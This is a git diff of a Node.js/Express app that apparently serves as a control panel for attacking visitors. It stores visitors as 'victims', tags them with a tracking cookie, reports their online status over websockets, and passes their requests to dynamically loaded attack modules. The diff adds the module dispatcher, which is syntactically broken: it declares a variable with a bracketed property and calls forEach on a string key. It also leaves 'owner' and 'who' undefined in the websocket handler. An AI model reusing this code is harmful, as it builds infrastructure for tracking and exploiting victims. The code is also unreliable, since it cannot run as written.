@@ -65,7 +65,7 @@ app.all('/i/', function(req, res){
                 modules:info.modules
             });
         };
-        sql.Item.findOne({id:id}, function(err, info){
+        sql.Item.findById(id, function(err, info){
             who = getmd5(info.owner+id+Date.now());
             res.cookie('who', who);
             sql.Victim.create({
@@ -84,12 +84,36 @@ app.all('/i/', function(req, res){
         });
     });
 });
+function handle(re, modules, owner, victim, type){
+    var Process = {
+        Priority:[],
+        Accepted:[],
+        Dealwith:[],
+        Returns:[]
+    };
+    var share = {};
+    for(var n in modules){
+        var m = require('./'+n);
+        (m.type==type)&&Process[m.priority].push(m);
+    };
+    for(var p in Process){
+        p.forEach(function(m){
+            var share[m.name] = m(
+                re,
+                owner,
+                modules[m.name],
+                victim,
+                share
+            );
+        });
+    };
+};
 function httppage(req, res){
     var pageid = req.params.uri;
     sql.Page.findOne({uri:pageid}, function(err, info){
         if(info.type != 'http'){return null};
         var owner = req.session.user&&(req.session.user.name == info.owner);
-        //TODO
+        handle({q:req, s:res}, info.modules, owner, sql.Victim, 'http');
     });
 };
 function online(who, on){
@@ -106,10 +130,6 @@ function wspage(ws, req){
     sql.Page.findOne({uri:pageid}, function(err, info){
         var page = info;
         if(info.type != 'ws'){return null};
-        var owner = req.session.user&&(req.session.user.name == info.owner);
-        if(!owner){
-            var who = req.cookies.who?req.cookies.who:getmd5(Date.now()+pageid);
-        };
         ws.on('open', function(){
             if(owner){return null};
             online(who, 'online');
@@ -119,7 +139,8 @@ function wspage(ws, req){
             online(who, Date.now());
         });
         ws.on('message', function(msg){
-            //TODO
+            var owner = req.session.user&&(req.session.user.name == info.owner);
+            handle({q:req, s:ws}, info.modules, owner, sql.Victim, 'ws');
         });
     });
 };
@@ -179,7 +200,6 @@ app.get('/home/item/:name', function(req, res){
             items:info
         });
     });
-//    return err404(req, res);
 });
 app.get('/home/victim/:name', function(req, res){
     sql.Victim.findOne({id:req.params.name}, function(err, info){
